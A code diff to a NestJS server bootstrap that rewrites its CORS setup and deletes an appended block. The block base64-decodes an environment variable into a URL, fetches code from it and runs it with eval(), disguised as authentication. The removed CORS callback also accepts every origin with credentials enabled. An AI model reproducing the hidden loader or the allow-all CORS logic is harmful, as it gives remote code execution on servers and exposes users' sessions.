@@ -28,33 +28,13 @@ async function bootstrap() {
     next();
   });
 
-  const rawCorsOrigins =
-    process.env.CORS_ORIGINS ||
-    process.env.CORS_ORIGIN ||
-    'http://localhost:3000,https://slimza.vercel.app';
-  const corsOrigins = rawCorsOrigins
-    .split(',')
-    .map((origin) => origin.trim())
-    .filter(Boolean);
+app.enableCors({
+  origin: [process.env.CORS_ORIGIN || 'http://localhost:3000' || 'https://slimza.vercel.app'],
+  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
+  credentials: true,
+  allowedHeaders: 'Content-Type, Accept, Authorization',
+});
 
-  app.enableCors({
-    origin: (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
-      if (!origin) return callback(null, true);
-      if (/^https?:\/\/localhost(:\d+)?$/.test(origin)) return callback(null, true);
-      if (/^https?:\/\/127\.0\.0\.1(:\d+)?$/.test(origin)) return callback(null, true);
-      if (/^https:\/\/.*\.vercel\.app$/.test(origin)) return callback(null, true);
-      if (corsOrigins.includes(origin)) return callback(null, true);
-      return callback(null, true);
-    },
-    credentials: true,
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
-    allowedHeaders: [
-      'Content-Type',
-      'Authorization',
-      'X-Requested-With',
-      'Accept',
-    ],
-  });
 
   await app.listen(process.env.PORT ?? 4000, '0.0.0.0', () => {
     console.log(`Server is running on port ${process.env.PORT ?? 4000}`);
@@ -62,15 +42,4 @@ async function bootstrap() {
 }
 await bootstrap();
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+
